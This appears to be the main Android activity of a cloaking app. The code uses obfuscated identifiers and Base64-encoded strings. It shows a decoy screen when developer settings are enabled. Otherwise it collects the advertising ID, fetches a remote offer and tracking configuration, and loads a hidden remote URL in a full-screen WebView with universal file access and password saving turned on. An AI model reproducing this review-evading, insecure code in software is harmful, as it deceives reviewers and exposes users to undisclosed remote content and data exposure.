package com.ssetcer.oefljgun;

import static com.ssetcer.oefljgun.FaceBook.dataFbKkkkSsetcerOefljgun;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;

import java.io.File;
import java.io.IOException;

public class SOJ extends AppCompatActivity {
    WebView inetViewSsetcerOefljgun;
    public String trueThreeArraySsetcerOefljgun[];
    public String trueLinkOllSsetcerOefljgun;
    public String linkPrefSaveSsetcerOefljgun;
    public ValueCallback<Uri[]> fileClbkSsetcerOefljgun;
    public String photoCameraSsetcerOefljgun;
    public ValueCallback<Uri> messageSaveSsetcerOefljgun;
    public Uri uriSsetcerOefljgun;
    public String cameraStringSsetcerOefljgun;
    public String trueOfferSsetcerOefljgun;
    public String trueZamokSsetcerOefljgun;
    public String trueMettaIdSsetcerOefljgun;
    public static String idAppsKKSsetcerOefljgun;
    public static String kKkIdContextSsetcerOefljgun;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getWindow().addFlags(1024);
        inetViewSsetcerOefljgun = findViewById(R.id.internet);
        HTTPconect httPconect = new HTTPconect();
        idAppsKKSsetcerOefljgun = httPconect.AppsConnect(this);
        httPconect.SignalConnect(this);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                        kKkIdContextSsetcerOefljgun = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                } catch (Exception e) {
                }
            }
        }).start();
        int setDev = SetDev();
        if (setDev == 1) {
            Intent intentLoad = new Intent(SOJ.this, loadView.class);
            startActivity(intentLoad);
            finishAffinity();
        } else if (setDev == 0) {
            try {
                trueLinkOllSsetcerOefljgun = HTTPconect.RequestThree();
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        trueThreeArraySsetcerOefljgun = HTTPconect.lineSsetcerOefljgun.split("\\u007c");
                        trueOfferSsetcerOefljgun = trueThreeArraySsetcerOefljgun[0];
                        trueZamokSsetcerOefljgun = trueThreeArraySsetcerOefljgun[1];
                        trueMettaIdSsetcerOefljgun = trueThreeArraySsetcerOefljgun[2];

                        new FaceBook(trueMettaIdSsetcerOefljgun, SOJ.this);

                    }
                }, 3000);
                SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
                linkPrefSaveSsetcerOefljgun = sharedPreferences.getString(HTTPconect.Dec("cXdlcjEyMzQ="), null);
                if (linkPrefSaveSsetcerOefljgun != null) {
                    goWeb(linkPrefSaveSsetcerOefljgun);
                } else {
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            httPconect.MainMethod(trueOfferSsetcerOefljgun, trueZamokSsetcerOefljgun,
                                    dataFbKkkkSsetcerOefljgun, SOJ.this);
                        }
                    }, 5000);
                }
            } catch (Exception e) {

            }
        }
    }

    public void goWeb(String golineSsetcerOefljgun) {
        inetViewSsetcerOefljgun.setVisibility(View.VISIBLE);
        inetViewSsetcerOefljgun.getSettings().setJavaScriptEnabled(true);
        inetViewSsetcerOefljgun.getSettings().setAppCacheEnabled(true);
        inetViewSsetcerOefljgun.getSettings().setDomStorageEnabled(true);
        inetViewSsetcerOefljgun.getSettings().setAllowContentAccess(true);
        inetViewSsetcerOefljgun.getSettings().setAllowFileAccess(true);
        inetViewSsetcerOefljgun.getSettings().setAppCacheEnabled(true);
        inetViewSsetcerOefljgun.getSettings().setAllowFileAccessFromFileURLs(true);
        inetViewSsetcerOefljgun.getSettings().setSaveFormData(true);
        inetViewSsetcerOefljgun.getSettings().setMixedContentMode(0);
        inetViewSsetcerOefljgun.getSettings().setSavePassword(true);
        inetViewSsetcerOefljgun.getSettings().setAllowContentAccess(true);
        inetViewSsetcerOefljgun.getSettings().setLoadsImagesAutomatically(true);
        inetViewSsetcerOefljgun.getSettings().setAllowUniversalAccessFromFileURLs(true);
        inetViewSsetcerOefljgun.getSettings().setDatabaseEnabled(true);
        inetViewSsetcerOefljgun.getSettings().setLoadWithOverviewMode(true);
        inetViewSsetcerOefljgun.getSettings().setUseWideViewPort(true);
        inetViewSsetcerOefljgun.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        inetViewSsetcerOefljgun.getSettings().setDomStorageEnabled(true);
        inetViewSsetcerOefljgun.getSettings().setAllowFileAccess(true);
        inetViewSsetcerOefljgun.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        inetViewSsetcerOefljgun.getSettings().setEnableSmoothTransition(true);
        inetViewSsetcerOefljgun.loadUrl(golineSsetcerOefljgun);

        inetViewSsetcerOefljgun.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView viewSsetcerOefljgun, String urlSsetcerOefljgun) {
                super.onPageFinished(viewSsetcerOefljgun, urlSsetcerOefljgun);
                SharedPreferences spp = PreferenceManager.getDefaultSharedPreferences(viewSsetcerOefljgun.getContext());
                SharedPreferences.Editor editPref = spp.edit();
                editPref.putString(HTTPconect.Dec("cXdlcjEyMzQ="), urlSsetcerOefljgun);
                editPref.apply();
            }

            @Override
            public void onPageStarted(WebView viewSsetcerOefljgun, String urlSsetcerOefljgun,
                                      Bitmap faviconSsetcerOefljgun) {
                super.onPageStarted(viewSsetcerOefljgun, urlSsetcerOefljgun, faviconSsetcerOefljgun);
                if (urlSsetcerOefljgun.contains(HTTPconect.Dec("Z2FwcHM9NDA0"))) {
                    Intent intentLoad = new Intent(SOJ.this, loadView.class);
                    startActivity(intentLoad);
                    finishAffinity();
                }
            }
        });
        inetViewSsetcerOefljgun.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onShowFileChooser(WebView webViewSsetcerOefljgun,
                                             ValueCallback<Uri[]> filePathCallbackSsetcerOefljgun,
                                             FileChooserParams fileChooserParamsSsetcerOefljgun) {
                if (fileClbkSsetcerOefljgun != null) {
                    fileClbkSsetcerOefljgun.onReceiveValue(null);
                }
                fileClbkSsetcerOefljgun = filePathCallbackSsetcerOefljgun;

                Intent intentImageSsetcerOefljgun = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                if (intentImageSsetcerOefljgun.resolveActivity(getPackageManager()) != null) {
                    File photo = null;
                    try {
                        photo = downloadFile();
                        intentImageSsetcerOefljgun.putExtra(HTTPconect.Dec("UGhvdG9QYXRo"), photoCameraSsetcerOefljgun);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    if (photo != null) {
                        photoCameraSsetcerOefljgun = HTTPconect.Dec("ZmlsZTo=") + photo.getAbsolutePath();
                        intentImageSsetcerOefljgun.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(photo));
                    } else {
                        intentImageSsetcerOefljgun = null;
                    }
                }
                Intent intentContentSsetcerOefljgun = new Intent(Intent.ACTION_GET_CONTENT);
                intentContentSsetcerOefljgun.addCategory(Intent.CATEGORY_OPENABLE);
                intentContentSsetcerOefljgun.setType(HTTPconect.Dec("aW1hZ2UvKg=="));

                Intent[] arrayIntentSsetcerOefljgun;
                if (intentImageSsetcerOefljgun != null) {
                    arrayIntentSsetcerOefljgun = new Intent[]{intentImageSsetcerOefljgun};
                } else {
                    arrayIntentSsetcerOefljgun = new Intent[0];
                }
                Intent intentChooserSsetcerOefljgun = new Intent(Intent.ACTION_CHOOSER);
                intentChooserSsetcerOefljgun.putExtra(Intent.EXTRA_INTENT, intentContentSsetcerOefljgun);
                intentChooserSsetcerOefljgun.putExtra(Intent.EXTRA_TITLE, HTTPconect.Dec("RmlsZSBDaG9vc2Vy"));
                intentChooserSsetcerOefljgun.putExtra(Intent.EXTRA_INITIAL_INTENTS, arrayIntentSsetcerOefljgun);
                startActivityForResult(intentChooserSsetcerOefljgun, 1);
                return true;
            }

            public File downloadFile() throws IOException {
                File imageFileSsetcerOefljgun = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                        HTTPconect.Dec("RGlyZWN0b3J5TmFtZUhlcmU="));

                if (imageFileSsetcerOefljgun.exists()) {
                    imageFileSsetcerOefljgun.mkdirs();
                }
                imageFileSsetcerOefljgun = new File(imageFileSsetcerOefljgun + File.separator +
                        HTTPconect.Dec("SU1HXw==") + String.valueOf(System.currentTimeMillis()) +
                        HTTPconect.Dec("LmpwZw=="));
                return imageFileSsetcerOefljgun;
            }
        });
    }

    @Override
    protected void onActivityResult(int requestSsetcerOefljgun, int resultCodeSsetcerOefljgun, @Nullable Intent dataSsetcerOefljgun) {
        super.onActivityResult(requestSsetcerOefljgun, resultCodeSsetcerOefljgun, dataSsetcerOefljgun);

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            if (requestSsetcerOefljgun == 1) {
                if (null == this.messageSaveSsetcerOefljgun) {
                    return;
                }
                Uri resultSsetcerOefljgun = null;
                try {
                    if (resultCodeSsetcerOefljgun != RESULT_OK) {
                        resultSsetcerOefljgun = null;
                    } else {
                        resultSsetcerOefljgun = dataSsetcerOefljgun == null ? uriSsetcerOefljgun : dataSsetcerOefljgun.getData();
                    }
                } catch (Exception e) {

                }
                messageSaveSsetcerOefljgun.onReceiveValue(resultSsetcerOefljgun);
                messageSaveSsetcerOefljgun = null;
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestSsetcerOefljgun != 1 || fileClbkSsetcerOefljgun == null) {
                super.onActivityResult(requestSsetcerOefljgun, resultCodeSsetcerOefljgun, dataSsetcerOefljgun);
                return;
            }
            Uri[] resultsSsetcerOefljgun = null;
            if (resultCodeSsetcerOefljgun == Activity.RESULT_OK) {
                if (dataSsetcerOefljgun == null || dataSsetcerOefljgun.getData() == null) {
                    if (cameraStringSsetcerOefljgun != null) {
                        resultsSsetcerOefljgun = new Uri[]{Uri.parse(cameraStringSsetcerOefljgun)};
                    }
                } else {
                    String dataString = dataSsetcerOefljgun.getDataString();
                    if (dataString != null) {
                        resultsSsetcerOefljgun = new Uri[]{Uri.parse(dataString)};
                    }
                }
            }
            fileClbkSsetcerOefljgun.onReceiveValue(resultsSsetcerOefljgun);
            fileClbkSsetcerOefljgun = null;
        }
    }

    public int SetDev() {
        int setDevSsetcerOefljgun = Settings.Secure.getInt(this.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        return setDevSsetcerOefljgun;
    }

    @Override
    public void onBackPressed() {
        if (inetViewSsetcerOefljgun.isFocused() && inetViewSsetcerOefljgun.canGoBack()) {
            inetViewSsetcerOefljgun.goBack();
        }
    }


}